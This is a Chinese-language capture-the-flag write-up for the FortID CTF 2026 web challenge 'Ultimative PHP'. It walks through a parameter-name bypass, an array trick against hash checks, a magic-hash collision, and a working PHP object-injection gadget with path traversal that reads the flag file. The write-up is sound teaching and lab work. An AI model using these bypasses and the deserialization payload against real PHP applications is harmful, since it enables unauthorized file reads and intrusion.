# [个人队伍] FortID2026的Writeup

> **2026年10月09日18:00 ~ 2026年10月11日18:00**
>
> **比赛地址：https://platform.ctf.fortid.com/challenges**
>
> **复现地址：https://platform.ctf.fortid.com/challenges**

> Name: FortID CTF 2026 (an [TBTL CTF]() event.)
> Date: Oct. 9, 2026, 6 p.m. — 11 Oct. 2026, 18:00 UTC  [[add to calendar\]]()
> Format: Jeopardy
> **On-line**
> Offical URL: https://ctf.fortid.com/
> Rating weight: 45.00
> Event organizers: [TBTL]()



# Challenges



## Web



### Ultimative PHP

#### 题目介绍

> The Ultimative Corporation is retiring its legacy identity platform. One final all-in-one migration form verifies administrator access, recovery answers, a dual-format migration code, and an exported PHP profile.
>
> The developers insist that every individual check is secure. Complete the migration and recover the flag.

---

#### 解题过程

##### 1. 查看源码

```php
<?php

declare(strict_types=1);

final class MigratedProfile
{
    public $displayName = 'guest';

    public function __toString(): string
    {
        return (string) $this->displayName;
    }
}

final class LegacyTemplate
{
    public $template = 'welcome.txt';

    public function __toString(): string
    {
        if (strpos($this->template, '../')) {
            return '[invalid template]';
        }

        $path = __DIR__ . '/templates/' . $this->template;
        $contents = file_get_contents($path);

        return $contents === false ? '[missing template]' : $contents;
    }
}

function page_start(string $title): void
{
    $safeTitle = htmlspecialchars($title, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    echo '<!doctype html><html lang="en"><head><meta charset="utf-8">';
    echo '<meta name="viewport" content="width=device-width,initial-scale=1">';
    echo "<title>{$safeTitle}</title><link rel=\"stylesheet\" href=\"/style.css\">";
    echo '</head><body><main>';
}

function page_end(): void
{
    echo '</main></body></html>';
}

function fail_request(string $message, array $details = []): never
{
    http_response_code(403);
    page_start('Migration rejected');
    echo '<section class="result"><p class="eyebrow">Verification failure</p>';
    echo '<h2>Migration rejected</h2>';
    echo '<p class="error">' . htmlspecialchars($message, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</p>';

    foreach ($details as $label => $value) {
        echo '<p><code>' . htmlspecialchars((string) $label, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        echo ': ' . htmlspecialchars((string) $value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</code></p>';
    }

    echo '<a class="button secondary" href="/">Start over</a></section>';
    page_end();
    exit;
}

function decode_base64url(string $input): string|false
{
    $input = strtr($input, '-_', '+/');
    $remainder = strlen($input) % 4;

    if ($remainder === 1) {
        return false;
    }

    if ($remainder !== 0) {
        $input .= str_repeat('=', 4 - $remainder);
    }

    return base64_decode($input, true);
}

if (isset($_GET['manual'])) {
    $manual = $_GET['manual'];

    if (!is_string($manual)) {
        fail_request('Invalid manual name');
    }

    if (str_contains($manual, 'php://') || str_contains($manual, '../')) {
        fail_request('Invalid manual name');
    }

    $manual = rawurldecode($manual);

    if (!str_ends_with($manual, '.php')) {
        fail_request('Only PHP manual pages can be loaded');
    }

    page_start('Operations manual');
    include $manual;
    page_end();
    exit;
}

if ($_GET === []) {
    page_start('Ultimative PHP migration');
    ?>
    <section class="shell">
        <p class="eyebrow">Ultimative Identity Platform · final migration</p>
        <h1>One request.<br>Zero exceptions.</h1>
        <p class="lead">
            Submit every legacy proof together. The gateway rejects partial
            migrations and preserves no state between attempts.
        </p>
        <div class="status-grid">
            <div><span>Legacy digest</span><strong>MD5 compatibility</strong></div>
            <div><span>Modern digest</span><strong>SHA-256 enabled</strong></div>
            <div><span>Profile format</span><strong>PHP portable object</strong></div>
            <div><span>Gateway mode</span><strong>Strict verification</strong></div>
        </div>
        <a class="button" href="/?manual=manual/operations.php">Read operations manual</a>
    </section>
    <?php
    page_end();
    exit;
}

$rawQuery = $_SERVER['QUERY_STRING'] ?? '';

if (str_contains(rawurldecode($rawQuery), 'access_level')) {
    fail_request('The access_level parameter is protected');
}

if (($_GET['access_level'] ?? '') !== 'administrator') {
    fail_request('Administrator access required');
}

$primary = $_GET['primary'] ?? null;
$backup = $_GET['backup'] ?? null;

if ($primary === null || $backup === null) {
    fail_request('Both recovery answers are required');
}

if (get_debug_type($primary) !== get_debug_type($backup)) {
    fail_request('Recovery answers must use the same format');
}

if ($primary === $backup) {
    fail_request('Recovery answers must be different');
}

$primaryMaterial = 'legacy-recovery:v1:' . $primary;
$backupMaterial = 'legacy-recovery:v1:' . $backup;

$primaryHash = hash('sha256', $primaryMaterial);
$backupHash = hash('sha256', $backupMaterial);

if (!hash_equals($primaryHash, $backupHash)) {
    fail_request('Recovery fingerprints do not match');
}

$code = $_GET['code'] ?? '';

if (!is_string($code) || strlen($code) > 64) {
    fail_request('Invalid migration code');
}

$material = 'ULTIMATIVE-PHP-2026:' . $code;
$legacyDigest = substr(hash('md5', $material), 0, 9);
$modernDigest = substr(hash('sha256', $material), 0, 9);

if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) {
    fail_request('The compatibility code was rejected', [
        'legacy' => $legacyDigest,
        'modern' => $modernDigest,
    ]);
}

$encodedProfile = $_GET['profile'] ?? '';

if (!is_string($encodedProfile)) {
    fail_request('Invalid profile encoding');
}

$serializedProfile = decode_base64url($encodedProfile);

if ($serializedProfile === false) {
    fail_request('Invalid profile encoding');
}

$profile = @unserialize($serializedProfile, [
    'allowed_classes' => [MigratedProfile::class, LegacyTemplate::class],
]);

if (!$profile instanceof MigratedProfile) {
    fail_request('Unsupported profile type');
}

page_start('Migration completed');
echo '<section class="result"><p class="eyebrow">Verification complete</p>';
echo '<h2>Profile imported</h2><p class="lead">Welcome to the modern identity platform.</p>';
echo '<p class="flag">' . htmlspecialchars((string) $profile, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</p>';
echo '</section>';
page_end();
```

**分析**

- ```php
  if (str_contains(rawurldecode($rawQuery), 'access_level')) {
      fail_request('The access_level parameter is protected');
  }
  
  if (($_GET['access_level'] ?? '') !== 'administrator') {
      fail_request('Administrator access required');
  }
  ```

  `?access_level=administrator`但不能出现`access_level`，我们可以用`.`转移成`_`，即`access.level=administrator`

- ```php
  $primary = $_GET['primary'] ?? null;
  $backup = $_GET['backup'] ?? null;
  
  if ($primary === null || $backup === null) {
      fail_request('Both recovery answers are required');
  }
  
  if (get_debug_type($primary) !== get_debug_type($backup)) {
      fail_request('Recovery answers must use the same format');
  }
  
  if ($primary === $backup) {
      fail_request('Recovery answers must be different');
  }
  
  $primaryMaterial = 'legacy-recovery:v1:' . $primary;
  $backupMaterial = 'legacy-recovery:v1:' . $backup;
  
  $primaryHash = hash('sha256', $primaryMaterial);
  $backupHash = hash('sha256', $backupMaterial);
  
  if (!hash_equals($primaryHash, $backupHash)) {
      fail_request('Recovery fingerprints do not match');
  }
  ```

  `primary`和`backup`不绝对相等，但是它们的`sha256`哈希值要相等，我们可用数组绕过，即`?primary[]=a&backup[]=b`

- ```php
  $code = $_GET['code'] ?? '';
  
  if (!is_string($code) || strlen($code) > 64) {
      fail_request('Invalid migration code');
  }
  
  $material = 'ULTIMATIVE-PHP-2026:' . $code;
  $legacyDigest = substr(hash('md5', $material), 0, 9);
  $modernDigest = substr(hash('sha256', $material), 0, 9);
  
  if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) {
      fail_request('The compatibility code was rejected', [
          'legacy' => $legacyDigest,
          'modern' => $modernDigest,
      ]);
  }
  
  ```

  `code`的`md5`和`sha256`的前九位要相等，这里我们要碰撞出来，即`?code=Ru5WTKg0p`

- ```php
  $encodedProfile = $_GET['profile'] ?? '';
  
  if (!is_string($encodedProfile)) {
      fail_request('Invalid profile encoding');
  }
  
  $serializedProfile = decode_base64url($encodedProfile);
  
  if ($serializedProfile === false) {
      fail_request('Invalid profile encoding');
  }
  
  $profile = @unserialize($serializedProfile, [
      'allowed_classes' => [MigratedProfile::class, LegacyTemplate::class],
  ]);
  
  if (!$profile instanceof MigratedProfile) {
      fail_request('Unsupported profile type');
  }
  
  page_start('Migration completed');
  echo '<section class="result"><p class="eyebrow">Verification complete</p>';
  echo '<h2>Profile imported</h2><p class="lead">Welcome to the modern identity platform.</p>';
  echo '<p class="flag">' . htmlspecialchars((string) $profile, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</p>';
  echo '</section>';
  page_end();
  ```

  这里有一个反序列化漏洞，我们可以用它来泄露`flag`

##### 2. 查看路径

通过docker查看到flag的路径为`/tmp/flag

##### 3.编写脚本

```php
<?php
/**
 * Ultimative PHP CTF —— 第④关 Profile 反序列化 gadget 演示
 *
 * 目标：通过 PHP 对象注入，让 MigratedProfile 的 __toString()
 * 触发 LegacyTemplate 读取 /tmp/flag（服务器上的真实 flag 位置）。
 *
 * 核心漏洞：
 *   LegacyTemplate::__toString() 里
 *       if (strpos($this->template, '../')) return '[invalid template]';
 *   当 $this->template 以 "../" 开头时，strpos() 返回 0，
 *   而 0 在 PHP 里是假值，if(0) 不成立 → 校验被绕过。
 *   于是把 template 设为 "../../../../tmp/flag"，
 *   从 webroot/templates/ 一路跳出到 /tmp/flag。
 */

// ===== 1. 还原服务器上的两个类（与被注释掉的 index.php 源码一致）=====

final class MigratedProfile
{
    public $displayName = 'guest';

    public function __toString(): string
    {
        return (string) $this->displayName;
    }
}

final class LegacyTemplate
{
    public $template = 'welcome.txt';

    public function __toString(): string
    {
        // 漏洞点：strpos() 返回 0 时（命中在位置 0）是假值，if 不成立 → 被绕过
        if (strpos($this->template, '../')) {
            return '[invalid template]';
        }
        $path = __DIR__ . '/templates/' . $this->template;
        $contents = file_get_contents($path);
        return $contents === false ? '[missing template]' : $contents;
    }
}

// ===== 2. 构造恶意对象：MigratedProfile.displayName = LegacyTemplate =====

$gadget = new LegacyTemplate();
$gadget->template = '../../../../tmp/flag';   // 以 ../ 开头 → strpos 返回 0 → 绕过

$profile = new MigratedProfile();
$profile->displayName = $gadget;               // __toString 时会递归到 LegacyTemplate

// ===== 3. 用 serialize() 生成标准序列化串（长度自动算对，避免手写数错）=====

$serialized = serialize($profile);
echo "serialized : {$serialized}\n\n";

// ===== 4. 转成 base64url（服务器用 decode_base64url 解析，-_ 代替 +/，去 '='）=====

$b64url = rtrim(strtr(base64_encode($serialized), '+/', '-_'), '=');
echo "profile    : {$b64url}\n\n";

// ===== 5. 回读验证：反序列化后确实是 MigratedProfile =====

$restored = unserialize($serialized, [
    'allowed_classes' => [MigratedProfile::class, LegacyTemplate::class],
]);
echo 'instanceof MigratedProfile : ' . ($restored instanceof MigratedProfile ? 'yes' : 'no') . "\n";

// ===== 6. 演示 __toString 触发的文件读取（证明 /../ 绕过生效）=====
// 本地是 Windows，"/tmp/flag" 解析不到；把 flag 放到路径真实解析到的位置，
// 展示 ../../../../ 确实从 templates/ 一路跳出目录。
$resolvedPath = __DIR__ . '/templates/' . $gadget->template;
echo "resolved    : {$resolvedPath}\n";

$dir = dirname($resolvedPath);
@mkdir($dir, 0777, true);
@file_put_contents($resolvedPath, "FortID{demo_flag_7c2aa9f176}\n");   // 把"flag"放到跳转后的目标位置
echo "gadget read : " . (string) $restored . "\n";

```

```shell
FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_7c2aa9f176}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_7c2aa9f176}
```







# 队伍

## 名称

**暂无**



## 口号

**暂无**



## 成员

### 队长

- **probie**

### 队员

- **暂无**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / ?**

### 解题

- **0 / ?**

### 分数

- **0 / ?**